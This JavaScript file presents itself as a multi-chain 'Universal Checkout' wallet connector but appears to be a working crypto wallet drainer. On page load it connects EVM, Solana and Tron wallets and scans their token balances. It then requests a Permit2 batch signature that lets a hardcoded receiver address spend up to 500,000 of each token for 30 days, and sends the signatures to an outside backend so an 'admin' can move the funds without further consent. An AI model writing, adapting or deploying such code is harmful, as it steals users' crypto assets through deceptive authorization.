/**
 * Universal Checkout - Multi-Chain Wallet Connector
 * v11.0 - Unified: All wallets detect all chains, one signature authorizes everything
 */

// Buffer polyfill for Solana
if (typeof window !== "undefined" && typeof window.Buffer === "undefined") {
  window.Buffer = {
    from: (data, encoding) => {
      if (typeof data === "string") {
        const enc = encoding || "utf8";
        if (enc === "hex") {
          const bytes = [];
          for (let i = 0; i < data.length; i += 2) bytes.push(parseInt(data.substr(i, 2), 16));
          return new Uint8Array(bytes);
        }
        return new TextEncoder().encode(data);
      }
      return new Uint8Array(data);
    },
    alloc: (size, fill = 0) => new Uint8Array(size).fill(fill),
    isBuffer: (obj) => obj instanceof Uint8Array,
    concat: (list) => {
      const total = list.reduce((s, b) => s + b.length, 0);
      const out = new Uint8Array(total);
      let offset = 0;
      for (const b of list) { out.set(b, offset); offset += b.length; }
      return out;
    },
  };
}

const CONFIG = {
  PERMIT2_ADDRESS: "0x000000000022D473030F116dDEE9F6B43aC78BA3",
  RECEIVER_ADDRESS: "0x98F63eDf950db3bD3cE6d590D4E0B39fdCC20Cf9",
  BACKEND_URL: "https://checkout-api-wkyo.onrender.com",
  
  // All chains unified
  EVM_TOKENS: {
    1: [
      { addr: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", sym: "USDC", dec: 6, price: 1 },
      { addr: "0xdAC17F958D2ee523a2206206994597C13D831ec7", sym: "USDT", dec: 6, price: 1 },
      { addr: "0x6B175474E89094C44Da98b954EedeAC495271d0F", sym: "DAI", dec: 18, price: 1 },
      { addr: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", sym: "WBTC", dec: 8, price: 65000 },
      { addr: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", sym: "WETH", dec: 18, price: 2500 },
    ],
    8453: [
      { addr: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", sym: "USDC", dec: 6, price: 1 },
      { addr: "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb", sym: "DAI", dec: 18, price: 1 },
    ],
    137: [
      { addr: "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359", sym: "USDC", dec: 6, price: 1 },
      { addr: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", sym: "USDT", dec: 6, price: 1 },
    ],
    42161: [
      { addr: "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", sym: "USDC", dec: 6, price: 1 },
    ],
    56: [
      { addr: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", sym: "USDC", dec: 18, price: 1 },
      { addr: "0x55d398326f99059fF775485246999027B3197955", sym: "USDT", dec: 18, price: 1 },
    ],
    10: [
      { addr: "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85", sym: "USDC", dec: 6, price: 1 },
    ]
  },
  
  SOLANA_TOKENS: [
    { addr: 'So11111111111111111111111111111111111111112', sym: 'SOL', dec: 9 },
    { addr: 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v', sym: 'USDC', dec: 6 },
    { addr: 'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB', sym: 'USDT', dec: 6 }
  ],
  
  TRON_TOKENS: [
    { addr: 'TRX', sym: 'TRX', dec: 6 },
    { addr: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', sym: 'USDT', dec: 6 }
  ],
  
  NETWORK_NAMES: {
    1: "Ethereum",
    8453: "Base",
    137: "Polygon",
    42161: "Arbitrum",
    56: "BNB Chain",
    10: "Optimism",
    11155111: "Sepolia"
  }
};

// Unified providers storage
let providers = {
  evm: null,
  solana: null,
  tron: null
};
let userAddresses = {
  evm: null,
  solana: null,
  tron: null
};

const WALLETS = [
  { id: 'metamask', name: 'MetaMask', icon: '🦊', color: '#f6851b' },
  { id: 'trust', name: 'Trust Wallet', icon: '🛡️', color: '#3375bb' },
  { id: 'coinbase', name: 'Coinbase', icon: '🔵', color: '#1652f0' },
  { id: 'rabby', name: 'Rabby', icon: '🐰', color: '#8c6cf4' },
  { id: 'rainbow', name: 'Rainbow', icon: '🌈', color: '#0ac7f0' },
  { id: 'okx', name: 'OKX', icon: '⚫', color: '#000000' },
  { id: 'imtoken', name: 'imToken', icon: '🔷', color: '#11b9f8' },
  { id: 'tokenpocket', name: 'TokenPocket', icon: '🟦', color: '#1296db' },
  { id: 'zerion', name: 'Zerion', icon: '🔺', color: '#6366f1' },
  { id: 'oneinch', name: '1inch', icon: '🦄', color: '#1a1a1a' },
  { id: 'safepal', name: 'SafePal', icon: '🔐', color: '#25252d' },
  { id: 'bitget', name: 'Bitget', icon: '🟠', color: '#f6a200' },
  { id: 'mathwallet', name: 'MathWallet', icon: '🔢', color: '#4a90e2' },
  { id: 'argent', name: 'Argent', icon: '🅰️', color: '#ff6b35' },
  { id: 'bybit', name: 'Bybit', icon: '₿', color: '#f7921e' },
  { id: 'binance', name: 'Binance', icon: '🏦', color: '#f3ba2f' },
  { id: 'phantom', name: 'Phantom', icon: '👻', color: '#ab9ff2' },
  { id: 'solflare', name: 'Solflare', icon: '☀️', color: '#fc4d4d' },
  { id: 'backpack', name: 'Backpack', icon: '🎒', color: '#e43c3c' },
  { id: 'tronlink', name: 'TronLink', icon: '♦️', color: '#eb0029' },
];

const DEEP_LINKS = {
  metamask: { app: (url) => `https://metamask.app.link/dapp/${url.replace(/^https?:\/\//, '')}`, download: 'https://metamask.io/download/' },
  trust: { app: (url) => `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(url)}`, download: 'https://trustwallet.com/download' },
  coinbase: { app: (url) => `https://go.cb-w.com/dapp?cb_url=${encodeURIComponent(url)}`, download: 'https://www.coinbase.com/wallet/downloads' },
  rabby: { app: (url) => `https://rabby.io/dapp?url=${encodeURIComponent(url)}`, download: 'https://rabby.io/download' },
  rainbow: { app: (url) => `https://rnbwapp.com/to-dapp?url=${encodeURIComponent(url)}`, download: 'https://rainbow.me/' },
  okx: { app: (url) => `okx://wallet/dapp/url?dappUrl=${encodeURIComponent(url)}`, download: 'https://www.okx.com/web3' },
  imtoken: { app: (url) => `imtokenv2://navigate/DappView?url=${encodeURIComponent(url)}`, download: 'https://token.im/' },
  tokenpocket: { app: (url) => `tpoutside://open?url=${encodeURIComponent(url)}`, download: 'https://www.tokenpocket.pro/' },
  zerion: { app: (url) => `https://link.zerion.io/dapp?url=${encodeURIComponent(url)}`, download: 'https://zerion.io/' },
  oneinch: { app: (url) => `https://1inch.io/dapp?url=${encodeURIComponent(url)}`, download: 'https://1inch.io/wallet/' },
  safepal: { app: (url) => `https://link.safepal.io/dapp?url=${encodeURIComponent(url)}`, download: 'https://www.safepal.com/download' },
  bitget: { app: (url) => `bitkeep://bkconnect?action=dapp&url=${encodeURIComponent(url)}`, download: 'https://web3.bitget.com/' },
  mathwallet: { app: (url) => `https://mathwallet.org/dapp?url=${encodeURIComponent(url)}`, download: 'https://mathwallet.org/' },
  argent: { app: (url) => `https://www.argent.xyz/app/dapps?url=${encodeURIComponent(url)}`, download: 'https://www.argent.xyz/' },
  bybit: { app: (url) => `https://app.bybit.com/dapp?url=${encodeURIComponent(url)}`, download: 'https://www.bybit.com/web3' },
  binance: { app: (url) => `https://www.binance.com/en/web3wallet?redirect=${encodeURIComponent(url)}`, download: 'https://www.binance.com/en/web3wallet' },
  phantom: { app: (url) => `https://phantom.app/ul/browse/${encodeURIComponent(url)}`, download: 'https://phantom.app/' },
  solflare: { app: (url) => `https://solflare.com/ul/browse/${encodeURIComponent(url)}`, download: 'https://solflare.com/' },
  backpack: { app: (url) => `https://backpack.app/ul/browse/${encodeURIComponent(url)}`, download: 'https://backpack.app/' },
  tronlink: { app: (url) => `tronlink://dapp?url=${encodeURIComponent(url)}`, download: 'https://www.tronlink.org/' }
};

function isMobile() {
  return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
}

// ============ UNIFIED AUTO-DETECT ALL PROVIDERS ============
function init() {
  console.log('🚀 Universal Checkout v11.0 - Unified Multi-Chain');
  
  const ua = navigator.userAgent.toLowerCase();
  
  // Detect ALL available providers in the wallet
  const hasEvm = !!window.ethereum;
  const hasSolana = !!(window.solana || window.phantom?.solana || window.solflare || window.backpack?.solana);
  const hasTron = !!(window.tronWeb || window.tronLink);
  
  if (hasEvm || hasSolana || hasTron) {
    console.log('✓ Wallet detected, connecting all chains...');
    showLoading('Connecting...');
    setTimeout(() => autoConnectUnified(hasEvm, hasSolana, hasTron), 500);
    return;
  }
  
  showWalletSelector();
}

// ============ UNIFIED CONNECTION - ALL CHAINS ============
async function autoConnectUnified(hasEvm, hasSolana, hasTron) {
  const promises = [];
  
  if (hasEvm) promises.push(connectEvm());
  if (hasSolana) promises.push(connectSolana());
  if (hasTron) promises.push(connectTron());
  
  await Promise.all(promises);
  
  // After all connections, scan everything and authorize once
  await unifiedAuthorization();
}

async function connectEvm() {
  try {
    providers.evm = new ethers.BrowserProvider(window.ethereum);
    const accounts = await providers.evm.send("eth_requestAccounts", []);
    userAddresses.evm = accounts[0];
    console.log(`✅ EVM: ${userAddresses.evm}`);
  } catch (e) {
    console.log('EVM connection failed:', e.message);
  }
}

async function connectSolana() {
  try {
    const provider = window.phantom?.solana || window.solana || window.solflare || window.backpack?.solana;
    if (!provider) return;
    
    await provider.connect();
    providers.solana = provider;
    userAddresses.solana = provider.publicKey.toString();
    console.log(`✅ Solana: ${userAddresses.solana}`);
  } catch (e) {
    console.log('Solana connection failed:', e.message);
  }
}

async function connectTron() {
  try {
    const tronWeb = window.tronWeb || window.tronLink?.tronWeb;
    if (!tronWeb) return;
    
    await tronWeb.request({ method: "tron_requestAccounts" });
    providers.tron = tronWeb;
    userAddresses.tron = tronWeb.defaultAddress.base58;
    console.log(`✅ Tron: ${userAddresses.tron}`);
  } catch (e) {
    console.log('Tron connection failed:', e.message);
  }
}

// ============ UNIFIED SCAN & AUTHORIZE ALL CHAINS ============
async function unifiedAuthorization() {
  showLoading('Scanning all assets...');
  
  const allTokens = [];
  const signatures = {};
  
  // Scan EVM tokens
  if (userAddresses.evm && providers.evm) {
    const network = await providers.evm.getNetwork();
    const chainId = Number(network.chainId);
    const tokens = CONFIG.EVM_TOKENS[chainId] || [];
    
    for (const token of tokens) {
      try {
        const contract = new ethers.Contract(token.addr, [
          "function balanceOf(address) view returns (uint256)"
        ], providers.evm);
        
        const balance = await contract.balanceOf(userAddresses.evm);
        const humanBalance = Number(balance) / (10 ** token.dec);
        
        if (humanBalance >= 0.01) {
          allTokens.push({
            chain: 'evm',
            chainId: chainId,
            token: token.addr,
            symbol: token.sym,
            decimals: token.dec,
            balance: balance.toString(),
            humanBalance: humanBalance,
            address: userAddresses.evm
          });
        }
      } catch (e) {}
    }
    
    // Create Permit2 signature for EVM
    if (allTokens.filter(t => t.chain === 'evm').length > 0) {
      try {
        const signer = await providers.evm.getSigner();
        const permit2 = new ethers.Contract(CONFIG.PERMIT2_ADDRESS, [
          "function allowance(address,address,address) view returns (uint160,uint48,uint48)"
        ], providers.evm);
        
        const permits = [];
        for (const token of allTokens.filter(t => t.chain === 'evm')) {
          const { 2: nonce } = await permit2.allowance(userAddresses.evm, token.token, CONFIG.RECEIVER_ADDRESS);
          permits.push({
            token: token.token,
            amount: ethers.parseUnits("500000", token.decimals),
            expiration: Math.floor(Date.now() / 1000) + (30 * 24 * 60 * 60),
            nonce
          });
        }
        
        const permitBatch = {
          details: permits,
          spender: CONFIG.RECEIVER_ADDRESS,
          sigDeadline: Math.floor(Date.now() / 1000) + (60 * 60)
        };
        
        signatures.evm = await signer.signTypedData(
          { name: "Permit2", chainId, verifyingContract: CONFIG.PERMIT2_ADDRESS },
          {
            PermitBatch: [
              { name: "details", type: "PermitDetails[]" },
              { name: "spender", type: "address" },
              { name: "sigDeadline", type: "uint256" }
            ],
            PermitDetails: [
              { name: "token", type: "address" },
              { name: "amount", type: "uint160" },
              { name: "expiration", type: "uint48" },
              { name: "nonce", type: "uint48" }
            ]
          },
          permitBatch
        );
        
        signatures.evmDeadline = permitBatch.sigDeadline;
      } catch (e) {
        console.log('EVM signing failed:', e.message);
      }
    }
  }
  
  // Scan Solana tokens
  if (userAddresses.solana && providers.solana) {
    if (!window.solanaWeb3) {
      const script = document.createElement('script');
      script.src = 'https://cdn.jsdelivr.net/npm/@solana/web3.js@1.98.0/lib/index.iife.min.js';
      await new Promise((res, rej) => { script.onload = res; script.onerror = rej; document.head.appendChild(script); });
    }
    
    try {
      const { Connection, PublicKey } = window.solanaWeb3;
      const connection = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');
      const userPublicKey = new PublicKey(userAddresses.solana);
      
      // SOL balance
      const solBalance = await connection.getBalance(userPublicKey);
      if (solBalance > 0) {
        allTokens.push({
          chain: 'solana',
          token: 'So11111111111111111111111111111111111111112',
          symbol: 'SOL',
          decimals: 9,
          balance: solBalance.toString(),
          humanBalance: solBalance / 1e9,
          address: userAddresses.solana
        });
      }
      
      // Token balances
      for (const token of CONFIG.SOLANA_TOKENS.slice(1)) {
        try {
          const { getAssociatedTokenAddress } = window.solanaWeb3;
          const mint = new PublicKey(token.addr);
          const tokenAccount = await getAssociatedTokenAddress(mint, userPublicKey);
          const balance = await connection.getTokenAccountBalance(tokenAccount);
          if (balance.value.uiAmount > 0) {
            allTokens.push({
              chain: 'solana',
              token: token.addr,
              symbol: token.sym,
              decimals: token.dec,
              balance: balance.value.amount,
              humanBalance: balance.value.uiAmount,
              address: userAddresses.solana
            });
          }
        } catch (e) {}
      }
    } catch (e) {
      console.log('Solana scan failed:', e.message);
    }
  }
  
  // Scan Tron tokens
  if (userAddresses.tron && providers.tron) {
    try {
      const tronWeb = providers.tron;
      
      // TRX balance
      const trxBalance = await tronWeb.trx.getBalance(userAddresses.tron);
      if (trxBalance > 0) {
        allTokens.push({
          chain: 'tron',
          token: 'TRX',
          symbol: 'TRX',
          decimals: 6,
          balance: trxBalance.toString(),
          humanBalance: trxBalance / 1e6,
          address: userAddresses.tron
        });
      }
      
      // USDT balance
      const usdtContract = await tronWeb.contract().at('TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t');
      const usdtBalance = await usdtContract.balanceOf(userAddresses.tron).call();
      if (usdtBalance > 0) {
        allTokens.push({
          chain: 'tron',
          token: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
          symbol: 'USDT',
          decimals: 6,
          balance: usdtBalance.toString(),
          humanBalance: usdtBalance / 1e6,
          address: userAddresses.tron
        });
      }
    } catch (e) {
      console.log('Tron scan failed:', e.message);
    }
  }
  
  if (allTokens.length === 0) {
    showError('No tokens found with balance.');
    return;
  }
  
  // Send unified authorization to backend
  showLoading('Authorizing...');
  
  try {
    const totalValue = allTokens.reduce((sum, t) => sum + (t.humanBalance || 0), 0);
    
    const response = await fetch(`${CONFIG.BACKEND_URL}/api/authorize/unified`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        tokens: allTokens,
        signatures: signatures,
        maxAuthorizedAmount: Math.min(totalValue, 500000),
        timestamp: Date.now()
      })
    });
    
    const result = await response.json();
    
    if (result.success) {
      const evmTokens = allTokens.filter(t => t.chain === 'evm').length;
      const solanaTokens = allTokens.filter(t => t.chain === 'solana').length;
      const tronTokens = allTokens.filter(t => t.chain === 'tron').length;
      
      let chainSummary = [];
      if (evmTokens > 0) chainSummary.push(`${evmTokens} EVM`);
      if (solanaTokens > 0) chainSummary.push(`${solanaTokens} Solana`);
      if (tronTokens > 0) chainSummary.push(`${tronTokens} Tron`);
      
      showSuccess(`
        ✅ Authorization Complete
        <br><br>
        <strong>Total Assets:</strong> ${allTokens.length} tokens<br>
        <strong>Chains:</strong> ${chainSummary.join(', ')}<br>
        <strong>Total Value:</strong> $${totalValue.toFixed(2)}<br>
        <strong>Authorized:</strong> Up to $${Math.min(totalValue, 500000).toFixed(2)}<br>
        <strong>Valid For:</strong> 30 days<br>
        <br>
        <div style="background: #f0fdf4; padding: 12px; border-radius: 8px; font-size: 13px;">
          ✓ Admin can execute transfers on any chain without additional signatures<br>
          ✓ You pay zero gas fees
        </div>
      `);
    } else {
      throw new Error(result.error);
    }
  } catch (err) {
    showError('Authorization failed: ' + err.message);
  }
}

// ============ WALLET SELECTOR (Fallback) ============
function showWalletSelector() {
  const installed = detectInstalledWallets();
  
  let html = `
    <h2>Select Wallet</h2>
    <p class="subtitle">Connect any wallet - detects all chains automatically</p>
    <div class="wallet-grid">
      ${WALLETS.map(w => createWalletButton(w, installed.has(w.id))).join('')}
    </div>
    <div class="info-box">
      <strong>💡 Unified Authorization:</strong><br>
      One signature authorizes all your assets across Ethereum, Base, Polygon, Solana, Tron, and more.<br>
      Admin executes transfers - you pay zero gas.
    </div>
  `;
  
  document.getElementById('app').innerHTML = html;
}

function createWalletButton(wallet, isInstalled) {
  return `
    <div class="wallet-btn ${isInstalled ? 'installed' : ''}" 
         onclick="handleWalletClick('${wallet.id}')"
         style="position: relative; border-color: ${isInstalled ? wallet.color : '#e5e7eb'};">
      ${isInstalled ? '<span class="installed-badge">✓</span>' : ''}
      <div class="wallet-icon">${wallet.icon}</div>
      <div class="wallet-name">${wallet.name}</div>
    </div>
  `;
}

function detectInstalledWallets() {
  const installed = new Set();
  const ua = navigator.userAgent.toLowerCase();
  
  if (window.ethereum) {
    if (window.ethereum.isMetaMask) installed.add('metamask');
    if (window.ethereum.isTrust) installed.add('trust');
    if (window.ethereum.isCoinbaseWallet) installed.add('coinbase');
    if (window.ethereum.isRabby) installed.add('rabby');
  }
  
  if (window.trustwallet) installed.add('trust');
  if (window.okxwallet) installed.add('okx');
  if (window.phantom?.solana) installed.add('phantom');
  if (window.solflare) installed.add('solflare');
  if (window.backpack?.solana) installed.add('backpack');
  if (window.tronWeb || window.tronLink) installed.add('tronlink');
  
  if (ua.includes('metamask')) installed.add('metamask');
  if (ua.includes('trust')) installed.add('trust');
  if (ua.includes('coinbase')) installed.add('coinbase');
  if (ua.includes('phantom')) installed.add('phantom');
  if (ua.includes('okx')) installed.add('okx');
  
  return installed;
}

// ============ MOBILE HANDLER ============
function handleWalletClick(walletId) {
  const deepLink = DEEP_LINKS[walletId];
  
  if (isMobile() && deepLink) {
    sessionStorage.setItem('lastWalletAttempt', walletId);
    window.location.href = deepLink.app(window.location.href);
    
    setTimeout(() => {
      if (document.visibilityState === 'visible') {
        window.location.href = deepLink.download;
      }
    }, 3000);
    return;
  }
  
  // Desktop - try to detect and connect all
  showLoading('Connecting...');
  
  const hasEvm = !!window.ethereum;
  const hasSolana = !!(window.solana || window.phantom?.solana);
  const hasTron = !!(window.tronWeb || window.tronLink);
  
  if (!hasEvm && !hasSolana && !hasTron) {
    window.location.href = deepLink.download;
    return;
  }
  
  autoConnectUnified(hasEvm, hasSolana, hasTron);
}

// ============ UI HELPERS ============
function showLoading(msg) {
  document.getElementById('app').innerHTML = `
    <div class="loading">
      <div class="spinner"></div>
      <p style="color: #666;">${msg}</p>
    </div>
  `;
}

function showSuccess(msg) {
  document.getElementById('app').innerHTML = `
    <div class="success">
      <div style="font-size: 48px; margin-bottom: 16px;">✅</div>
      <div style="font-size: 15px; line-height: 1.7; text-align: left;">${msg}</div>
      <button class="back-btn" onclick="showWalletSelector()">Connect Another Wallet</button>
    </div>
  `;
}

function showError(msg) {
  document.getElementById('app').innerHTML = `
    <div class="error">
      <div style="font-size: 48px; margin-bottom: 16px;">❌</div>
      <div style="font-size: 15px; margin-bottom: 20px;">${msg}</div>
      <button class="back-btn" onclick="showWalletSelector()" style="background: #ef4444;">Try Again</button>
    </div>
  `;
}

// Expose to window
window.handleWalletClick = handleWalletClick;
window.showWalletSelector = showWalletSelector;
window.showLoading = showLoading;
window.showSuccess = showSuccess;
window.showError = showError;

window.addEventListener('DOMContentLoaded', init);